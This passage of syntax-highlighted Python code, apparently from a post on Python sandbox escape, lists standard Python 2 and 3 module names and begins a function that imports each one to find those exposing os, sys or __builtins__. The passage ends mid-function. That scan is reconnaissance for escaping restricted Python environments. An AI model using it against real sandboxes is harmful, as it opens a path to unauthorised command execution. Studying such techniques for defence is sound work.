class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tkFont&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tkMessageBox&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;tkSimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;toaiff&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_hotshot&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ensurepip&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;ttk&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;exceptions&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;fpformat&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;urlparse&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;_sha&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;future_builtins&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;rfc822&#x27;</span>, <span class="hljs-string">&#x27;xmllib&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_nd&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;xmlrpclib&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span>, <span class="hljs-string">&#x27;robotparser&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;hotshot&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;htmlentitydefs&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;htmllib&#x27;</span>, <span class="hljs-string">&#x27;sets&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;sgmllib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;ihooks&#x27;</span>, <span class="hljs-string">&#x27;sha&#x27;</span>
]

all_modules_3 = [
    <span class="hljs-string">&#x27;AptUrl&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;requests_unixsocket&#x27;</span>, <span class="hljs-string">&#x27;CommandNotFound&#x27;</span>, <span class="hljs-string">&#x27;apport&#x27;</span>, <span class="hljs-string">&#x27;hpmudext&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;Crypto&#x27;</span>, <span class="hljs-string">&#x27;apport_python_hook&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;DistUpgrade&#x27;</span>, <span class="hljs-string">&#x27;apt&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;HweSupportStatus&#x27;</span>, <span class="hljs-string">&#x27;apt_inst&#x27;</span>, <span class="hljs-string">&#x27;httplib2&#x27;</span>, <span class="hljs-string">&#x27;scanext&#x27;</span>, <span class="hljs-string">&#x27;LanguageSelector&#x27;</span>, <span class="hljs-string">&#x27;apt_pkg&#x27;</span>, <span class="hljs-string">&#x27;idna&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;NvidiaDetector&#x27;</span>, <span class="hljs-string">&#x27;aptdaemon&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;secrets&#x27;</span>, <span class="hljs-string">&#x27;PIL&#x27;</span>, <span class="hljs-string">&#x27;aptsources&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;secretstorage&#x27;</span>, <span class="hljs-string">&#x27;Quirks&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;UbuntuDrivers&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;selectors&#x27;</span>, <span class="hljs-string">&#x27;UbuntuSystemService&#x27;</span>, <span class="hljs-string">&#x27;asn1crypto&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;UpdateManager&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;ipaddress&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;asyncio&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;_asyncio&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;janitor&#x27;</span>, <span class="hljs-string">&#x27;simplejson&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;_blake2&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyring&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;_bootlocale&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;six&#x27;</span>, <span class="hljs-string">&#x27;_bz2&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;language_support_pkgs&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;_cffi_backend&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;launchpadlib&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;brlapi&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;socketserver&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;louis&#x27;</span>, <span class="hljs-string">&#x27;softwareproperties&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;speechd&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;lzma&#x27;</span>, <span class="hljs-string">&#x27;speechd_config&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;cairo&#x27;</span>, <span class="hljs-string">&#x27;macaroonbakery&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;_collections_abc&#x27;</span>, <span class="hljs-string">&#x27;certifi&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;_compat_pickle&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;_compression&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;_crypt&#x27;</span>, <span class="hljs-string">&#x27;chardet&#x27;</span>, <span class="hljs-string">&#x27;mako&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;markupsafe&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;statistics&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;_datetime&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;modual_test&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;_dbm&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;_dbus_bindings&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;_dbus_glib_bindings&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;nacl&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;_decimal&#x27;</span>, <span class="hljs-string">&#x27;concurrent&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;configparser&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;systemd&#x27;</span>, <span class="hljs-string">&#x27;_gdbm&#x27;</span>, <span class="hljs-string">&#x27;copyreg&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;cryptography&#x27;</span>, <span class="hljs-string">&#x27;oauth&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_imp&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;olefile&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;cups&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;cupsext&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;cupshelpers&#x27;</span>, <span class="hljs-string">&#x27;orca&#x27;</span>, <span class="hljs-string">&#x27;_lzma&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_markupbase&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;dbus&#x27;</span>, <span class="hljs-string">&#x27;pathlib&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;deb822&#x27;</span>, <span class="hljs-string">&#x27;pcardext&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_opcode&#x27;</span>, <span class="hljs-string">&#x27;debconf&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_operator&#x27;</span>, <span class="hljs-string">&#x27;debian&#x27;</span>, <span class="hljs-string">&#x27;pexpect&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;debian_bundle&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;_pickle&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_posixsubprocess&#x27;</span>, <span class="hljs-string">&#x27;defer&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_pydecimal&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;pkg_resources&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;typing&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;distro_info&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;ufw&#x27;</span>, <span class="hljs-string">&#x27;_sha1&#x27;</span>, <span class="hljs-string">&#x27;distro_info_test&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_sha3&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;urllib3&#x27;</span>, <span class="hljs-string">&#x27;_signal&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;usbcreator&#x27;</span>, <span class="hljs-string">&#x27;_sitebuiltins&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;problem_report&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;enum&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;venv&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;faulthandler&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;wadllib&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;ptyprocess&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_stat&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_string&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pyatspi&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;xdg&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_testbuffer&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;xkit&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;pygtkcompat&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_testimportmultiple&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;pymacaroons&#x27;</span>, <span class="hljs-string">&#x27;xmlrpc&#x27;</span>, <span class="hljs-string">&#x27;_testmultiphase&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;pyrfc3339&#x27;</span>, <span class="hljs-string">&#x27;xxlimited&#x27;</span>, <span class="hljs-string">&#x27;_thread&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;pytz&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;queue&#x27;</span>, <span class="hljs-string">&#x27;yaml&#x27;</span>, <span class="hljs-string">&#x27;_tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;gi&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;zipapp&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;gtweak&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_yaml&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;reportlab&#x27;</span>, <span class="hljs-string">&#x27;zope&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;reprlib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span>
]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search_for_os_sys_builins</span>():</span>
    methods = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>]

    results = &#123;&#125;
    <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> all_modules_3:
        results[module] = &#123;
            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">&#x27;result&#x27;</span>: &#123;&#125;
        &#125;

        <span class="hljs-keyword">try</span>:
            m = <span class="hljs-built_in">__import__</span>(module)
            attrs = <span class="hljs-built_in">dir</span>(m)
            <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> methods:
                <span class="hljs-keyword">if</span> method <span class="hljs-keyword">in</span> attrs:
                    result = <span class="hljs-string">&#x27;yes&#x27;</span>
                    results[module][<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-number">1</span>
